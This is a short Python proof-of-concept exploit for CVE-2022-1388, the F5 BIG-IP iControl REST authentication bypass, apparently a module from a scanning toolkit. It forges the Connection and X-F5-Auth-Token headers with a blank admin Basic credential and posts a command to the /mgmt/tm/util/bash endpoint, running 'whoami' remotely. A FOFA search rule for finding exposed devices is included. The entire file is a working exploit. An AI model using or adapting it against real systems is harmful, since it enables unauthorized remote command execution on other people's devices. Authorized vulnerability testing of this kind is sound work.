#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

from urllib import response
import requests
from Config.config_requests import ua

requests.packages.urllib3.disable_warnings()
# 脚本信息
######################################################
NAME = 'CVE-2022-1388'
AUTHOR = "JDQ"
REMARK = 'F5  BIG-IP iControl REST 身份验证绕过漏洞'
FOFA_RULE = 'icon_hash="-335242539"'
######################################################

headers = {
    "User-Agent": ua,
    "Host":"localhost",
    'Content-Type': 'application/json',
    'Connection': 'keep-alive, x-F5-Auth-Token',
    'X-F5-Auth-Token': 'a',
    'Authorization': 'Basic YWRtaW46'
}


def poc(target):
    data = {'command': "run", 'utilCmdArgs': "-c 'whoami'"}
    try:
        r = requests.post(target+'/mgmt/tm/util/bash', json=data,
                          headers=headers, verify=False, timeout=5)
        if r.status_code == 200 and 'commandResult' in r.text:
            print("[+] 目标 {} 存在漏洞".format(target))
            print(r.text)
    except Exception as e:
        pass


if __name__ == '__main__':
    poc("http://127.0.0.1")
